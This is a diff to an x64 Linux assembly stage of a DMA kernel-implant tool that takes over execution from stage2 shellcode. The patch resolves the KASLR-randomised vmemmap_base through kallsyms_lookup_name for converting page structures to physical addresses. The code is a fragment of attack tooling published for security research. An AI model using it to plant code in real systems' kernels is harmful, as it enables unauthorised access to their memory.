@@ -1,7 +1,7 @@
 ; lx64_stage3.asm : assembly to receive execution from stage2 shellcode.
 ; Compatible with Linux x64.
 ;
-; (c) Ulf Frisk, 2016
+; (c) Ulf Frisk, 2016, 2017
 ; Author: Ulf Frisk, pcileech@frizk.net
 ;
 
@@ -117,6 +117,7 @@ str_memcpy						db		'memcpy', 0
 str_schedule					db		'schedule', 0
 str_do_gettimeofday				db		'do_gettimeofday', 0
 str_page_offset_base			db		'page_offset_base', 0
+str_vmemmap_base				db		'vmemmap_base', 0
 str_walk_system_ram_range		db		'walk_system_ram_range', 0
 str_iounmap						db		'iounmap', 0
 str_ioremap_nocache				db		'ioremap_nocache', 0
@@ -194,15 +195,46 @@ m_phys_to_virt PROC
 m_phys_to_virt ENDP
 
 ; ------------------------------------------------------------------
+; Retrieve the VMEMMAP_BASE
+; Function uses Linux calling convention.
+; KASLR of vmemmap_base was introduced in kernel 4.10
+; in earlier versions it is fixed to: 0ffffea0000000000h
+; rdi -> addr of kallsysms_lookup_name
+; rax <- value of VMEMMAP_BASE
+; ------------------------------------------------------------------
+m_vmemmap_base PROC
+	MOV rax, rdi
+	LEA rdi, str_vmemmap_base
+	CALL rax
+	TEST rax, rax
+	JZ kaslr_memmap_disable
+	MOV rax, [rax]
+	RET
+	kaslr_memmap_disable:
+	MOV rax, 0ffffea0000000000h
+	RET
+m_vmemmap_base ENDP
+
+; ------------------------------------------------------------------
 ; Convert a struct_page to to a physical address (Linux)
 ; Function uses Windows calling convention (rcx = 1st param)
+; rcx -> addr of kallsysms_lookup_name
+; rdx -> addr of struct page
+; rax <- physical address
 ; ------------------------------------------------------------------
 m_page_to_phys PROC
-	MOV rax, 0ffffea0000000000h
-	SUB rcx, rax
-	SHR rcx, 7		; PFN
-	SHL rcx, 12
-	MOV rax, rcx
+	PUSH rdi
+	PUSH rsi
+	PUSH rdx
+	MOV rdi, rcx
+	CALL m_vmemmap_base
+	POP rdx
+	SUB rdx, rax
+	SHR rdx, 7		; PFN
+	SHL rdx, 12
+	MOV rax, rdx
+	POP rsi
+	POP rdi
 	RET
 m_page_to_phys ENDP
 
